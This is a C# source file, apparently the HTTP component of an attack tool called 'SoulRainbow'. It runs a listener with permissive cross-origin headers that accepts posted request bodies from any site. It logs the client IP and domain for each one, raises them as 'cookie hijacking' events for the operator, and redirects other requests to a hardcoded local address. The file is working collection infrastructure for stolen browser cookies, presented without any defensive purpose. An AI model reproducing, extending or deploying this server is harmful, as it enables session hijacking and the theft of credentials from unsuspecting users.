using System;
using System.Text;
using System.Net;
using System.IO;
using System.Windows.Forms;
using System.Data;

namespace SoulRainbow
{
    public class HTTPServer
    {
        public HTTPServer()
        {
            setProperties();
        }


        //public void setItem(string)

        private void setProperties()
        {
            this.listener = new HttpListener();
            this.reader = new FileManager("config.conf");
            
        }

        //this function establish the response body of the request(XML, txt, messaging, etc...)

        public void start()
        {

            string portLine = reader.readLineByString("XHR");
            string[] portLineSplit = portLine.Split(',');
            string port = portLineSplit[1];

            string serverPathLine = reader.readLineByString("serverPath");
            string[] serverPathLineSplit = serverPathLine.Split(',');
            this.serverPath = serverPathLineSplit[1];


            //setting prefixes for http
            listener.Prefixes.Add("http://*:" + port + "/");
            listener.Prefixes.Add("https://*:8443/");
            listener.Prefixes.Add("https://*:8443/");
            //listener.Prefixes.Add("http://*:80/");

            listener.Start();
            listener.BeginGetContext(onCallback, null);


        }

        public void stop()
        {
            listener.Abort();
            listener.Close();

        }

        private void onCallback(IAsyncResult ar)
        {
            try
            {
                HttpListenerContext context = listener.EndGetContext(ar);

                //This line prevents server teardowns
                listener.BeginGetContext(onCallback, null);

                if (context.Request.RawUrl.Contains("/index"))
                {
                    //reques for the fisical location of the virtual folder requested
                    this.responseString = locateRequestedFile(context.Request.RawUrl);
                    string routingFile = serverPath + "/routing.txt";
                    //context.Response.ContentType = "application/xml";
                    //Enables CORS to be able to recive GET to transfer XML files
                    //TODO: when we have a domain change '*' to 'www.domain.com'
                    context.Response.AppendHeader("Access-Control-Allow-Origin", "*");
                    context.Response.AppendHeader("Access-Control-Allow-Methods", "POST, GET, OPTIONS, DELETE");
                    context.Response.AppendHeader("Access-Control-Allow-Headers", "*");


                    //send the request to be displayed in the program connections list
                    try
                    {
                        string accessControlHeader = context.Request.Headers.Get("Access-Control-Request-Headers");

                        if (context.Request.HasEntityBody) {
                            Stream StreamBody = context.Request.InputStream;
                            Encoding encoding = context.Request.ContentEncoding;
                            StreamReader reader = new StreamReader(StreamBody, encoding);
                            
                            var data = new CookieHijackingEventArgs();
                            data.ClientIP = context.Request.UserHostAddress;
                            data.Domain = context.Request.UserHostName;
                            data.AdditionalInfo = accessControlHeader + " body: " + reader.ReadToEnd();
                            OnCookieRecieved(data);
                        }
                        else if (accessControlHeader.Contains("soulrainbow|xml"))
                        {
                            var data = new ProcessEventArgs();
                            data.clientIP = context.Request.UserHostAddress;
                            data.additionalInfo = accessControlHeader;
                            OnClientRecieved(data);
                        }
                    }
                    catch
                    {
                        var data = new ProcessEventArgs();
                        data.clientIP = context.Request.UserHostAddress;
                        data.additionalInfo = "normal client on your site";
                        OnClientRecieved(data);
                    }


                    //converts to ASCII 
                    byte[] buffer = Encoding.ASCII.GetBytes(this.responseString);
                    context.Response.ContentLength64 = buffer.Length;

                    //send response content to the stream
                    Stream output = context.Response.OutputStream;
                    output.Write(buffer, 0, buffer.Length);
                }
                else
                {
                    //in case if the url dont include the virtual directory root folder redirects by default to them 
                    context.Response.Redirect(@"http://192.168.1.229:8443/index");
                    context.Response.Close();

                }
            }
            catch (Exception)
            {
                
                return;
            }

        }

        protected virtual void OnClientRecieved(ProcessEventArgs e)
        {
            clientRecieved?.Invoke(this, e);
        }

        protected virtual void OnCookieRecieved(CookieHijackingEventArgs e)
        {
            CookieRecieved?.Invoke(this, e);
        }

        
        //this method provides the fisical directory equivalent of the virtual directory using routing.txt like index
        private string locateRequestedFile(string url)
        {
            FileManager manager = new FileManager(serverPath + "/routing.txt");
            //read the requested file
            string[] fileReading = manager.readAll();
            string requestedDirectory;
            string responseString;
            //go throught the file searching for the fisical directory equivalent
            for (int i = 0; i < fileReading.Length; i++)
            {
                if (fileReading[i].Contains(url))
                {
                    //if finds a match separate in two by a coma (this is the format of routing.txt {\virtualdir\etc\, c:\windows\www\etc..})
                    string[] foo = fileReading[i].Split(',');
                    //get the fisical path
                    requestedDirectory = foo[1];
                    manager = new FileManager(requestedDirectory);
                    //reads all the file what will be displayed like html, xml, txt, etc..
                    fileReading = manager.readAll();
                    
                    //joins " " character to converts to string the read file
                    //TODO: search a best method to do same beacause the original file was transmited alterated
                    responseString = string.Join(" ", fileReading);
                    return responseString;
                }
            }
            //in case that not find coincidences for virtual directory in fisical return 404 like response string
            return "404";
        }



        private HttpListener listener;
        private FileManager reader;
        private string responseString;
        private string serverPath;
        

        
        //Event Handlers
        public event EventHandler<ProcessEventArgs> clientRecieved;
        public event EventHandler<CookieHijackingEventArgs> CookieRecieved;

    }

    public class ProcessEventArgs : EventArgs
    {
        public string clientIP { get; set; }
        public string additionalInfo { get; set; }
    }

    public class CookieHijackingEventArgs : EventArgs
    {
        public string ClientIP { get; set; }
        public string Domain { get; set; }
        public string AdditionalInfo { get; set; }
    }


}
